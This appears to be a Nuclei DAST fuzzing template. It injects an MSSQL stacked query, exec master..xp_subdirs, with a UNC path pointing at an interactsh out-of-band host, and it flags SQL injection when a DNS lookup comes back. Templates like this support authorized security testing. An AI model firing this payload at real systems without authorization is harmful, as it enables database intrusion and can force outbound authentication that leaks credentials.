http:
- fuzzing:
  - fuzz:
    - '{{subdirs}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    subdirs:
    - 1; exec master..xp_subdirs '\\{{interactsh-url}}\\test'--
  stop-at-first-match: true
id: ai-fuzz-xp-subdirs-oob
info:
  author: openai
  name: MSSQL xp_subdirs UNC path OOB
  severity: high
  tags: mssql,rce,sqli,oob,dast
